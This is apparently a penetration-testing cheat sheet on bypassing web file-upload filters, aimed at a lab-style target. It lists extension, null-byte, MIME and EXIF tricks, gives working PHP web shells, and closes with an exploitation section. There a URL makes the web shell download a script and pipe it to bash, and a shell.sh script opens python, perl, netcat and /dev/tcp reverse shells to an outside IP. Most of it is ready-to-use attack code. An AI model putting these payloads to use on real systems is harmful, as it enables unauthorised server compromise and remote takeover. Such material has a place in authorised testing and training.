# File upload bypass
According to OWASP the following list can be used by penetration testers in order to bypass a variety of protections.
- Content-Type —>Change the parameter in the request header using Burp, ZAP etc.
- Put server executable extensions like file.php5, file.shtml, file.asa, file.cert
- Changing letters to capital form file.aSp or file.PHp3
- Using trailing spaces and/or dots at the end of the filename like file.asp… … . . .. .. , file.asp , file.asp.
- Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
- Upload a file with 2 extensions—> file.php.jpg
- Use of null character—> file.asp%00.jpg
- Create a file with a forbidden extension —> file.asp:.jpg or file.asp::$data
- Combination of the above
## Bypassing Blacklists
Blacklisting is a type of protection where certain strings of data, in many cases, specific extensions, are explicitly prohibited from being sent to the web app server.
| Type       | Extention                                                       |
|------------|-----------------------------------------------------------------|
| php        | phtml, .php, .php3, .php4, .php5, .php6, .pht, .pHp, .Php, .phP |
| asp        | asp, .aspx                                                      |
| perl       | .pl, .pm, .cgi, .lib                                            |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf                              |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                                         |

Create **shell.pHp**
```php
<?php system($_GET['c']); ?>
```
## Bypassing Whitelists
Using a reverse shell with a photo extension
```console
payload.php.jpg
```
Also using a *null character* injection we can bypass whitelist filters to make characters get ignored when the file is saved, injecting this between a forbidden extension and an allowed extension can lead to a bypass:
```console
payload.php%00.jpg OR payload.php\x00.jpg
```
Usually, if an whitelist accepts only images, it may also accept gif files too. Adding GIF89a; to the very top of your shell may help you bypass the restriction and let you execute the shell.
```console
GIF89a; <?php system($_GET['cmd']); ?>
```
## MIME Type
Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type.
Normal php MIME type:
```console
Content-type: application/x-php
```
Replace with:
```console
Content-type: image/jpeg
```
## Exif Data, ExifTool (PHP getimagesize())
For file uploads which validate image size using php **getimagesize()**, it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as file.jpg.php.
```console
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
```
## Exploitation
```url
http://10.10.10.185/images/uploads/3.php.png?cmd=wget -O - http://10.10.16.5:1234/shell.sh | bash
```
 *don't forget to use burp to encode "wget -O - http://10.10.16.5:1234/shell.sh | bash"*
```url
http://10.10.10.185/images/uploads/3.php.png?cmd=%77%67%65%74%20%2d%4f%20%2d%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%35%3a%31%32%33%34%2f%73%68%65%6c%6c%2e%73%68%20%7c%20%62%61%73%68
```
Create file *shell.sh*
```sh
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.5",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi
if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="10.10.16.5";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi
if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 5555 >/tmp/f
        exit;
fi
if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/10.10.16.5/5555 0>&1
        exit;
fi
```
 *You can create a shell.sh file and do the same as above, or you can also manually try **reverse shell commands** one by one.*
